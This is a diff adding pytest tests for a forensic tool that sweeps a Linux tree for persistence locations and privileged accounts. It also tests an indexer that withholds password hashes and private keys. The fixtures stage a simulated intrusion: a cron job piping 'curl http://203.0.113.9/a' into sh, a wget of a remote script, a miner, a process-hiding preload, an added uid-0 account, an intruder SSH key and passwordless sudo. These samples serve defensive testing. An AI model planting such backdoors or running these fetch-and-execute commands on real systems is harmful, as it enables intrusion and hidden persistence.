@@ -1,0 +1,392 @@
+"""run_linux_persistence: what a Linux tree starts and whom it lets in, without a verdict."""
+
+from __future__ import annotations
+
+import os
+import subprocess
+from collections.abc import Iterator
+from pathlib import Path
+from typing import Any
+from unittest.mock import MagicMock, patch
+
+import pytest
+
+from mulder import dirroot
+from mulder.audit import AuditLog
+from mulder.db import CaseDB
+from mulder.linuxvol import EXPORT_MARKER, Volume, export_dir
+from mulder.server import app
+from mulder.server.app import _tool_dispatch_sync
+from mulder.server.helpers import TOOL_SOURCE_PREFIXES, tool_already_indexed
+from mulder.server.tools import linux
+from tests.triage_trees import kape, uac, write
+
+KEY = "ssh-rsa " + "AAAAB3NzaC1yc2EAAAADAQABAAABAQC7" * 8 + " intruder@kali"
+WHEN = 1_570_274_078  # 2019-10-05T11:14:38Z
+
+TREE: dict[str, bytes | str] = {
+    "etc/passwd": (
+        "root:x:0:0:root:/root:/bin/bash\n"
+        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+        "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
+        "toor:x:0:0::/var/tmp:/bin/sh\n"
+        "svc:x:999:999::/opt/svc:/bin/false\n"
+    ),
+    "etc/passwd-": (
+        "root:x:0:0:root:/root:/bin/bash\n"
+        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+        "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
+    ),
+    "etc/group": "root:x:0:\nsudo:x:27:alice,toor\nusers:x:100:bob\n",
+    "etc/crontab": "# m h dom mon dow user command\n17 * * * * root run-parts /etc/cron.hourly\n",
+    "etc/cron.d/sync": "*/5 * * * * root curl -s http://203.0.113.9/a | sh\n",
+    "var/spool/cron/crontabs/www-data": "@reboot /tmp/.x/miner\n",
+    "var/spool/cron/atjobs/a0000101": "#!/bin/sh\n/tmp/once\n",
+    "etc/systemd/system/update.service": "[Service]\nExecStart=/usr/local/bin/update\n",
+    "lib/systemd/system/ssh@.service": "[Service]\nExecStart=-/usr/sbin/sshd -i\n",
+    "lib/systemd/systemd": b"\x7fELF\x00",
+    "etc/rc.local": "#!/bin/sh\nexit 0\n",
+    "etc/ld.so.preload": "/usr/lib/libprocesshider.so\n",
+    "home/alice/.ssh/authorized_keys": KEY + "\n",
+    "home/alice/.bashrc": "# ~/.bashrc\n\nalias ll='ls -l'\n",
+    "home/alice/notes.txt": "not a persistence location\n",
+    "etc/profile.d/proxy.sh": "export http_proxy=http://10.0.0.1:3128\n",
+    "etc/sudoers.d/90-cloud": "alice ALL=(ALL) NOPASSWD:ALL\n",
+    "etc/modules-load.d/vbox.conf": "vboxdrv\n",
+    "etc/pam.d/sshd": "auth required pam_unix.so\n",
+    "etc/udev/rules.d/70-net.rules": 'SUBSYSTEM=="net", RUN+="/bin/x"\n',
+    "etc/update-motd.d/00-header": "#!/bin/sh\nuname -a\n",
+}
+
+
+@pytest.fixture
+def case(
+    tmp_case_db: CaseDB,
+    tmp_audit_log: AuditLog,
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> Iterator[CaseDB]:
+    ctx = app.ServerContext(
+        case_id="test-case", db=tmp_case_db, correlator=MagicMock(), audit=tmp_audit_log
+    )
+    monkeypatch.setattr(app, "_ctx", ctx)
+    monkeypatch.setattr(app, "_cfg", app.ServerConfig(db_dir=tmp_path / "cases"))
+    monkeypatch.setattr(linux, "probe", lambda image: ())
+    dirroot.refresh()
+    yield tmp_case_db
+    dirroot.refresh()
+
+
+def _tree(root: Path, files: dict[str, bytes | str] = TREE) -> Path:
+    write(root, files)
+    for path in root.rglob("*"):
+        os.utime(path, (WHEN, WHEN))
+    return root
+
+
+def _sweep(path: Path | str, **kwargs: object) -> dict[str, Any]:
+    return dict(_tool_dispatch_sync["run_linux_persistence"](image_path=str(path), **kwargs))
+
+
+def _rows(db: CaseDB) -> list[list[str]]:
+    text = "".join(w.raw_text for w in db.get_windows_by_source("linux.persistence"))
+    return [line.split("\t") for line in text.splitlines()[1:]]
+
+
+def test_one_row_per_file_with_its_path_time_size_and_first_lines(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    root = _tree(tmp_path / "root")
+
+    result = _sweep(root)["results"]
+
+    rows = {row[1]: row for row in _rows(case) if row[0] != "account"}
+    assert rows["etc/cron.d/sync"] == [
+        "cron",
+        "etc/cron.d/sync",
+        "modified=2019-10-05T11:14:38Z",
+        "size=51",
+        "*/5 * * * * root curl -s http://203.0.113.9/a | sh",
+    ]
+    kinds = {path: row[0] for path, row in rows.items()}
+    assert kinds == {
+        "etc/crontab": "cron",
+        "etc/cron.d/sync": "cron",
+        "var/spool/cron/crontabs/www-data": "cron",
+        "var/spool/cron/atjobs/a0000101": "cron",
+        "etc/systemd/system/update.service": "systemd",
+        "lib/systemd/system/ssh@.service": "systemd",
+        "etc/rc.local": "init",
+        "etc/ld.so.preload": "ld_preload",
+        "home/alice/.ssh/authorized_keys": "ssh",
+        "home/alice/.bashrc": "shell_profile",
+        "etc/profile.d/proxy.sh": "shell_profile",
+        "etc/sudoers.d/90-cloud": "sudoers",
+        "etc/modules-load.d/vbox.conf": "kernel_modules",
+        "etc/pam.d/sshd": "pam",
+        "etc/udev/rules.d/70-net.rules": "udev",
+        "etc/update-motd.d/00-header": "login_hooks",
+    }
+    # Comments are left out, and a key is shortened so that what follows it shows.
+    assert rows["etc/crontab"][4] == "17 * * * * root run-parts /etc/cron.hourly"
+    assert rows["home/alice/.ssh/authorized_keys"][4] == "ssh-rsa <...> intruder@kali"
+    assert rows["home/alice/.bashrc"][4] == "alias ll='ls -l'"
+    assert result["by_kind"]["cron"] == 4 and result["rows"] == len(_rows(case))
+    assert result["source"] == "linux.persistence" and result["files_not_readable"] == 0
+    assert [s.source_path for s in case.get_sources()] == [str(root)]
+
+
+def test_accounts_with_uid_0_a_shell_or_added_since_the_backup(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    _sweep(_tree(tmp_path / "root"))
+
+    accounts = [row[4] for row in _rows(case) if row[0] == "account"]
+    assert accounts == [
+        "name=root uid=0 gid=0 home=/root shell=/bin/bash (uid 0, has a login shell)",
+        "name=alice uid=1000 gid=1000 home=/home/alice shell=/bin/bash (has a login shell)",
+        "name=toor uid=0 gid=0 home=/var/tmp shell=/bin/sh "
+        "(uid 0, has a login shell, not in etc/passwd-)",
+        "name=svc uid=999 gid=999 home=/opt/svc shell=/bin/false (not in etc/passwd-)",
+        "group=sudo members=alice,toor",
+    ]
+
+
+def test_an_account_appended_to_a_long_passwd_is_still_seen(case: CaseDB, tmp_path: Path) -> None:
+    """New accounts go to the end of the file, well past the first lines of a large one."""
+    many = "".join(
+        f"svc{n}:x:{2000 + n}:{2000 + n}::/nonexistent:/usr/sbin/nologin\n" for n in range(400)
+    )
+    root = _tree(
+        tmp_path / "root",
+        {"etc/passwd": many + "support:x:0:0::/tmp:/bin/bash\n", "etc/passwd-": many},
+    )
+
+    _sweep(root)
+
+    assert [row[4] for row in _rows(case) if row[0] == "account"] == [
+        "name=support uid=0 gid=0 home=/tmp shell=/bin/bash "
+        "(uid 0, has a login shell, not in etc/passwd-)"
+    ]
+
+
+def test_it_reports_what_exists_and_passes_no_verdict(case: CaseDB, tmp_path: Path) -> None:
+    result = _sweep(_tree(tmp_path / "root"))["results"]
+
+    text = "".join(w.raw_text for w in case.get_windows_by_source("linux.persistence")).lower()
+    body = text.split("\n", 1)[1]
+    for word in ("malicious", "suspicious", "backdoor", "anomal", "severity"):
+        assert word not in body, word
+    for said in ("not that it is malicious", "ever ran", "can mean it was not copied"):
+        assert said in result["note"] and said in text.split("\n", 1)[0]
+    assert result["most_recently_modified"][0].split(" ")[2] == "modified=2019-10-05T11:14:38Z"
+
+
+def test_what_the_evidence_says_is_bounded_and_cannot_write_a_row(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    root = _tree(
+        tmp_path / "root",
+        {
+            "etc/passwd": "evil\tname\x1b[2J:x:0:0::/root:/bin/sh\n",
+            "etc/cron.d/a\tb": "x\n",
+            "etc/cron.d/long": "A = b\n" * 5000,
+            "etc/cron.d/forge": "ok\rcron\tetc/cron.d/planted\tmodified=x\tsize=1\tpwned\n",
+            "etc/cron.d/blob": b"\x00\x01\x02" * 100,
+        },
+    )
+    (root / "etc/cron.d/fifo").parent.mkdir(exist_ok=True)
+    os.mkfifo(root / "etc/cron.d/fifo")
+    (root / "etc/cron.d/link").symlink_to("/etc/passwd")
+
+    result = _sweep(root)["results"]
+
+    rows = _rows(case)
+    assert all(len(row) == 5 for row in rows)
+    by_path = {row[1]: row for row in rows}
+    assert set(by_path) == {
+        "etc/passwd",
+        "etc/cron.d/a^b",
+        "etc/cron.d/long",
+        "etc/cron.d/forge",
+        "etc/cron.d/blob",
+    }  # neither the FIFO nor the link out of the tree was opened
+    assert by_path["etc/cron.d/long"][3] == "size=30000"
+    assert len(by_path["etc/cron.d/long"][4]) <= 310 and by_path["etc/cron.d/long"][4].endswith(
+        "[cut]"
+    )
+    assert by_path["etc/cron.d/blob"][4] == "(binary)"
+    forged = by_path["etc/cron.d/forge"][4]
+    assert forged == "ok | cron etc/cron.d/planted modified=x size=1 pwned"
+    assert "name=evil name^[2J uid=0" in by_path["etc/passwd"][4]
+    assert result["truncated"] is False
+
+
+def test_a_collection_and_an_export_are_swept_by_the_paths_their_listings_show(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    collection = uac(tmp_path)
+    write(collection, {"[root]/etc/cron.d/job": "* * * * * root id\n"})
+    _sweep(collection)
+    assert ["cron", "etc/cron.d/job"] in [row[:2] for row in _rows(case)]
+
+    # An export: the root volume unprefixed, a volume mounted at /home under its own name.
+    export = tmp_path / "disk.E01.files-0123456789ab"
+    _tree(export / "p5_lvm1", {"etc/passwd": "root:x:0:0::/root:/bin/sh\n"})
+    _tree(export / "p5_lvm2", {"bob/.ssh/authorized_keys": KEY + "\n"})
+    write(export, {EXPORT_MARKER: "{}"})
+    dirroot.refresh()
+    _sweep(export)
+    listed = [row[1] for row in _rows(case)]
+    assert "p5_lvm2/bob/.ssh/authorized_keys" in listed and "etc/passwd" in listed
+
+
+def test_a_disk_image_sleuth_kit_reads_is_swept_through_its_listing(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    image = str(tmp_path / "ext4.dd")
+    Path(image).write_bytes(b"\x00" * 2048)
+    listing = (
+        "r/r 12:\tetc/crontab\nr/r * 13:\tetc/cron.d/gone\nd/d 14:\tetc/cron.d\n"
+        "l/l 15:\tetc/cron.d/link\n"
+    )
+    content = subprocess.CompletedProcess(["icat"], 0, b"0 5 * * * root /opt/job\n", b"")
+    with (
+        patch.object(linux, "_collect_fls_chunks", return_value=[([listing], 2048)]),
+        patch.object(linux, "icat", return_value=content) as icat,
+    ):
+        result = _sweep(image)["results"]
+
+    icat.assert_called_once_with(
+        image, 2048, "12"
+    )  # a deleted entry's inode may hold another file
+    assert _rows(case) == [
+        ["cron", "etc/crontab", "modified=unknown", "size=24", "0 5 * * * root /opt/job"]
+    ]
+    assert result["most_recently_modified"] == []
+
+
+def test_nothing_found_is_not_reported_as_a_clean_system(case: CaseDB, tmp_path: Path) -> None:
+    result = _sweep(kape(tmp_path / "k"))
+    assert result["error_type"] == "not_applicable"
+    assert "does not show the system has none" in result["suggestion"]
+    assert case.get_sources() == []
+
+    image = tmp_path / "lvm.dd"
+    image.write_bytes(b"x")
+    with patch.object(linux, "_collect_fls_chunks", return_value=[]):
+        unlisted = _sweep(image)
+    assert unlisted["error_type"] == "no_filelist"
+    assert unlisted["suggestion"] == "Run run_fls on the image first."
+    # Listed by Sleuth Kit, and none of the places in it: not "the system has none".
+    with patch.object(
+        linux, "_collect_fls_chunks", return_value=[(["r/r 5:\tboot/grub.cfg\n"], 0)]
+    ):
+        boot_only = _sweep(image)
+    assert boot_only["error_type"] == "not_applicable"
+    assert "does not show the system has none" in boot_only["suggestion"]
+
+
+def test_an_image_that_was_exported_is_answered_with_its_export_directory(
+    case: CaseDB, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    image = tmp_path / "lvm.E01"
+    image.write_bytes(b"x")
+    monkeypatch.setattr(linux, "probe", lambda path: (Volume(0, "lvm"),))
+    with patch.object(linux, "_collect_fls_chunks", return_value=[]):
+        assert "run export_linux_files" in _sweep(image)["suggestion"]
+        export = export_dir(tmp_path / "cases/extracted/test-case", str(image))
+        write(export, {EXPORT_MARKER: "{}"})
+        assert f"pass {export} as image_path" in _sweep(image)["suggestion"]
+
+
+def test_a_second_sweep_of_the_same_path_is_skipped(case: CaseDB, tmp_path: Path) -> None:
+    root = _tree(tmp_path / "root")
+    _sweep(root)
+
+    assert _sweep(root)["results"]["status"] == "skipped"
+    assert TOOL_SOURCE_PREFIXES["run_linux_persistence"] == ["linux.persistence"]
+    assert tool_already_indexed("run_linux_persistence", evidence_path=str(root))
+    assert not tool_already_indexed("run_linux_persistence", evidence_path=str(tmp_path / "b"))
+    assert _sweep(root, force=True)["results"]["rows"] > 0
+
+
+# --- the text indexer on a Linux tree ---------------------------------------
+
+
+def _index(root: Path, pattern: str, **kwargs: object) -> dict[str, Any]:
+    with patch("mulder.server.tools.extract.app_files.shutil.which", return_value="/usr/bin/icat"):
+        result = _tool_dispatch_sync["index_app_files"](
+            case_id="test-case", image_path=str(root), directory_pattern=pattern, **kwargs
+        )
+    results: dict[str, Any] = dict(result)["results"]
+    return results
+
+
+def test_on_a_linux_tree_the_content_decides_not_the_name(case: CaseDB, tmp_path: Path) -> None:
+    root = _tree(
+        tmp_path / "root",
+        {
+            "etc/passwd": "root:x:0:0::/root:/bin/bash\n",
+            "root/.bash_history": "wget http://203.0.113.9/x.sh\nchmod +x x.sh\n",
+            "root/.viminfo": "# viminfo\n",
+            "root/notes": "todo\n",
+            "root/payload": b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64,
+            "root/old.log.2.gz": b"\x1f\x8b\x08\x08" + b"\x55" * 64,
+            "root/big.txt": "A" * 4096,
+        },
+    )
+
+    result = _index(root, "root", max_file_size_kb=2)
+
+    assert result["extensions_used"] == ["*"]
+    assert sorted(result["sample_files"]) == ["root/.bash_history", "root/.viminfo", "root/notes"]
+    assert result["files_discovered"] == 6 and result["files_skipped_binary"] == 3
+    text = "".join(w.raw_text for w in case.get_windows_by_source("appfiles.root..bash_history"))
+    assert text.startswith("=== root/.bash_history ===") and "203.0.113.9/x.sh" in text
+
+
+def test_taking_every_name_does_not_take_password_hashes_or_private_keys(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    """The extension list used to keep etc/shadow out by accident; now it is on purpose."""
+    root = _tree(
+        tmp_path / "root",
+        {
+            "etc/passwd": "root:x:0:0::/root:/bin/bash\n",
+            "etc/shadow": "root:$6$salt$hash:19000:0:99999:7:::\n",
+            "etc/ssh/ssh_host_ed25519_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n",
+            "etc/ssh/ssh_host_ed25519_key.pub": "ssh-ed25519 AAAA root@web01\n",
+            "etc/ssh/sshd_config": "PermitRootLogin no\n",
+        },
+    )
+
+    result = _index(root, "etc")
+
+    assert sorted(result["sample_files"]) == [
+        "etc/passwd",
+        "etc/ssh/ssh_host_ed25519_key.pub",
+        "etc/ssh/sshd_config",
+    ]
+    assert result["files_withheld"] == 2
+    indexed = "".join(
+        w.raw_text for s in case.get_sources() for w in case.get_windows_by_source(s.source_name)
+    )
+    assert "$6$salt$hash" not in indexed and "PRIVATE KEY" not in indexed
+    only = _index(root, "etc/ssh", extensions=["*"], max_files=1)
+    assert only["files_withheld"] == 1 and only["files_discovered"] == 2
+
+
+def test_a_windows_tree_keeps_the_extension_list_unless_asked(
+    case: CaseDB, tmp_path: Path
+) -> None:
+    root = kape(tmp_path / "k")
+    write(root, {"C/Program Files/App/LICENSE": "MIT\n"})
+    dirroot.refresh()
+
+    assert _index(root, "Program Files/App")["sample_files"] == ["Program Files/App/app.ini"]
+    asked = _index(root, "Program Files/App", extensions=["*"])
+    assert sorted(asked["sample_files"]) == [
+        "Program Files/App/LICENSE",
+        "Program Files/App/app.ini",
+    ]
